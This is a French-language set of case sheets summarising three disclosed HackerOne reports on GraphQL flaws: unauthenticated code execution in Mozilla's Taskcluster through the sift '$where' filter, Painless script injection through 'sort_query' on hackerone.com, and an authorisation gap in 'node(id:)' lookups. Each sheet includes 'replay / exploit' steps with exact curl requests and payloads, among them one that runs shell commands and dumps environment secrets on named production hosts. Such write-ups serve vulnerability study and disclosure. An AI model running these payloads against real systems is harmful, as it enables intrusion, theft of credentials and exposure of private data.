# Fiches SSS — GraphQL

*3 cas réels 2025-2026 (HackerOne) : cause racine, preuves verbatim et plan de reproduction dérivés de la source uniquement.*

---

### Unauthenticated RCE in Taskcluster web-server via GraphQL filter argument (sift $where)

**📄 Cas réel**
sévérité : critical · [source](https://hackerone.com/reports/3782701)

L'endpoint public `/graphql` de `firefox-ci-tc.services.mozilla.com` (et `community-tc`) exécute du JavaScript arbitraire dans le processus Node.js du web-server. L'argument `filter` est un objet JSON libre passé directement à `sift` 17.1.3, dont l'opérateur `$where` compile une chaîne avec `new Function("obj", "return " + params)` ; `CSP_ENABLED` n'est pas défini sur le déploiement, donc la chaîne est bien transformée en code. Preuve : `RCE_42_object` calculé sur le serveur, commande `id` exécutée via `process.getBuiltinModule("child_process")`, environnement lu (DB creds, `TASKCLUSTER_ACCESS_TOKEN`, secrets OAuth, `DB_CRYPTO_KEYS`, `SESSION_SECRET=FIXME`). Aucune authentification ni en-tête spécial : un seul POST.

**Cause racine :** un argument GraphQL `filter` libre atteint `sift()` sans validation, et sift convertit une chaîne `$where` en code exécutable (`new Function`) quand `CSP_ENABLED` est absent ; le résolveur s'exécute aussi pour un appelant anonyme (le middleware appelle `next()` sans header `Authorization`).

**Preuve technique (verbatim depuis la source) :**

```
const $where = (params, ownerQuery, options) => {
  let test;
  if (isFunction(params)) {
    test = params;
  } else if (!process.env.CSP_ENABLED) {
    test = new Function("obj", "return " + params);   // <-- string becomes code

curl -s https://firefox-ci-tc.services.mozilla.com/graphql \
  -H 'Content-Type: application/json' \
  --data '{"query":"query($f:JSON){expandScopes(scopes:[\"assume:anonymous\"],filter:$f)}","variables":{"f":{"$where":"(function(){throw new Error(\"RCE_\"+(6*7)+\"_\"+(typeof process))})()"}}}'

uid=1000(node) gid=1000(node) groups=1000(node)
```

**Rejouer / exploiter (dérivé de la source) :**
- Prérequis : aucun (requêtes non authentifiées) ; instance Taskcluster avec `CSP_ENABLED` non défini et rôle `anonymous` portant `auth:expand-scopes` (firefox-ci-tc et community-tc confirmées).
- Étapes : 1. POST `/graphql` avec `expandScopes(scopes:["assume:anonymous"], filter: $f)` où `$f = {"$where": ...}` ; marqueur inoffensif `throw new Error("RCE_"+(6*7)+"_"+(typeof process))` → réponse `"RCE_42_object"`. 2. Exécuter une commande : `throw new Error(process.getBuiltinModule("child_process").execSync("id").toString())` → `uid=1000(node)…` (l'erreur est renvoyée au client via `formatError.js` qui transmet `err.message`). 3. Lire `process.env` par le même canal.
- Pièges / limites : l'exfiltration dépend du canal d'erreur (il faut que le script lève une erreur) ; valeurs de secrets volontairement exclues du rapport ; le même pattern existe pour `roles`, `listRoleIds`, `hookGroups`, `hooks`, `currentScopes` ; `CSP_ENABLED` n'est qu'une mitigation fragile.

**Reproductibilité :** haute — requête unique non authentifiée, payloads exacts fournis, aucune valeur secrète requise pour le test.

**Techniques :** graphql filter injection, sift $where operator abuse, code injection via new Function, unauth rce, error-message exfiltration, env dumping

**Correspond aux classes qualifiantes :** rce, code injection, unauth access

**Signal (endpoints/fonctions observés) :**
- `POST /graphql` — `expandScopes(scopes:[…], filter:$f)` (aussi roles, listRoleIds, hookGroups, hooks, currentScopes)
- `services/web-server/src/utils/sift.js` (passage direct à sift)
- `services/web-server/src/servers/formatError.js` (message d'erreur renvoyé au client)

**Paramètres impliqués :** `filter`, `$where`, `query`, `variables`, `scopes`

---

### Authenticated Elasticsearch Painless script execution via Query.search.sort_query

**📄 Cas réel**
sévérité : high · [source](https://hackerone.com/reports/3694007)

Sur `hackerone.com/graphql`, l'argument `sort_query: String` de `Query.search` est transmis tel quel au cluster Elasticsearch comme valeur brute du paramètre `sort`, sans validation de schéma ni rejet des directives scriptées. Depuis un compte reporter sans privilèges, le rapport démontre l'exécution Painless par deux requêtes ne différant que par `script.source` : `"unterminated` et `""` donnent HTTP 500 (`STANDARD_ERROR`, échec de compilation) tandis que `"1"` et `"1+1"` donnent 200 — et `doc["_seq_no"].value` change l'ordre des documents (zéro chevauchement avec le tri constant sur les cinq premières positions, ordre identique au tri `[{"id":"asc"}]`). Tests limités à `NotificationsIndex`, propre jeu de notifications du compte (716 documents).

**Cause racine :** une chaîne libre atteint le paramètre `sort` d'Elasticsearch sans allowlist, permettant une clause `_script` dont la source Painless est compilée et exécutée par document.

**Preuve technique (verbatim depuis la source) :**

```
# Request A — baseline, constant return
sq_A='[{"_script":{"type":"number","script":{"source":"1","lang":"painless"},"order":"asc"}}]'

# Request B — per-document field read
sq_B='[{"_script":{"type":"number","script":{"source":"doc[\"_seq_no\"].value","lang":"painless"},"order":"asc"}}]'

curl -sk 'https://hackerone.com/graphql' -H @/tmp/h1.headers -b "$COOKIE" \
  --data-raw '{"query":"query{search(index:NotificationsIndex,query_string:\"*\",sort_query:\"[{\\\"id\\\":\\\"asc\\\"}]\",size:5){nodes{... on NotificationDocument{id}}}}"}' | jq

The two result sets share zero overlapping documents in the first five positions.
```

**Rejouer / exploiter (dérivé de la source) :**
- Prérequis : compte authentifié niveau reporter ; session avec cookies (`__Host-session`, `cf_clearance`) et en-tête `x-csrf-token` du frontend ; le résultat est filtré côté serveur sur ses propres notifications.
- Étapes : 1. Confirmer l'identité : `{"query":"{me{_id username}}"}`. 2. Vérifier que `sort_query` accepte du JSON brut `[{"id":"asc"}]` (ordre croissant observé). 3. Sonder la compilation : `""` et `"unterminated` → 500 `STANDARD_ERROR` ; `"1"` → 200 `total_count: 716`. 4. Différentiel : Request A (`source:"1"`) vs Request B (`source:"doc[\"_seq_no\"].value"`), comparer les 5 premiers `edges` — aucun chevauchement.
- Pièges / limites : pause recommandée entre probes (sleep 1.2–2 s dans les boucles du rapport) ; Cloudflare (cf_clearance) ; seul `NotificationsIndex` a été testé ; surfaces additionnelles non testées : autres `IndexEnum` (`DuplicateDetectorReportsIndex`, `OpportunitiesIndex`, `CompleteHacktivityReportIndex`, `StoredQueriesIndex`) et `Organization.findings_search.sort_query`.

**Reproductibilité :** moyenne — nécessite un compte authentifié + CSRF token, mais toutes les requêtes et payloads sont fournis.

**Techniques :** graphql argument injection, elasticsearch painless script, sort injection, differential oracle, csrf token handling, per-document code execution

**Correspond aux classes qualifiantes :** code injection, rce (exécution dans le JVM ES), info disclosure (post-auth), dos (scripts coûteux)

**Signal (endpoints/fonctions observés) :**
- `POST /graphql` — `Query.search(sort_query: String)` avec clause `_script`
- `NotificationsIndex` (union `DocumentUnion`)
- autre resolver exposant le même argument : `Organization.findings_search.sort_query`

**Paramètres impliqués :** `sort_query`, `script.source`, `index`, `query_string`, `_seq_no`

---

### Disclosing PolicyPageAssetGroup in Private Programs via /graphql node lookup

**📄 Cas réel**
sévérité : critical · [source](https://hackerone.com/reports/1618347)

Selon le rapport, une mise à jour récente a rendu l'endpoint `/graphql` de HackerOne capable de retourner les objets `PolicyPageAssetGroup` de programmes privés sans autorisation. La requête `node(id:)` avec un identifiant Relay `gid://hackerone/PolicyPageAssetGroupsIndex::PolicyPageAssetGroup/3981-41287` retourne l'`id` global et le `name` du groupe d'actifs (nom masqué `██████` dans le rapport). Impact déclaré : divulgation du périmètre (assets) de programmes privés. Le texte source est minimal : une requête, une réponse, la mention « Without authorization ».

**Cause racine :** le résolveur `node(id:)` expose des objets `PolicyPageAssetGroupDocument` de programmes privés à un appelant non autorisé — contrôle d'autorisation manquant sur la résolution de ce type.

**Preuve technique (verbatim depuis la source) :**

```
`{"query":"{node(id:\"gid://hackerone/PolicyPageAssetGroupsIndex::PolicyPageAssetGroup/3981-41287\"){... on PolicyPageAssetGroupDocument{id,name}}}"}`

`{"data":{"node":{"id":"Z2lkOi8vaGFja2Vyb25lL1BvbGljeVBhZ2VBc3NldEdyb3Vwc0luZGV4OjpQb2xpY3lQYWdlQXNzZXRHcm91cC8zOTgxLTQxMjg3","name":"██████"}}}`

Without authorization
```

**Rejouer / exploiter (dérivé de la source) :**
- Prérequis : aucun — « Without authorization ». La source ne documente pas comment le `gid` (ici `3981-41287`, apparemment `programId-assetGroupId`) a été obtenu : non documenté dans la source.
- Étapes : 1. Poster la requête GraphQL ci-dessus sur `/graphql` avec `node(id:"gid://hackerone/PolicyPageAssetGroupsIndex::PolicyPageAssetGroup/<id>")`. 2. Lire `name` (et `id`) dans la réponse — groupe d'actifs de programme privé divulgé.
- Pièges / limites : la source ne donne ni contexte de découverte de l'ID, ni volume de données exposé, ni étapes complémentaires ; le nom retourné est masqué ; aucune réponse complète au-delà de l'exemple.

**Reproductibilité :** basse — la source ne documente pas l'obtention du `gid` et ne fournit qu'une requête/réponse minimales (pas assez d'étapes pour rejouer à l'aveugle).

**Techniques :** graphql node lookup, relay global id, access control bypass, private program disclosure

**Correspond aux classes qualifiantes :** idor, access control bypass, info disclosure

**Signal (endpoints/fonctions observés) :**
- `/graphql` — `node(id:)` puis fragment `... on PolicyPageAssetGroupDocument{id,name}`
- `gid://hackerone/PolicyPageAssetGroupsIndex::PolicyPageAssetGroup/{id}`

**Paramètres impliqués :** `id`, `name`
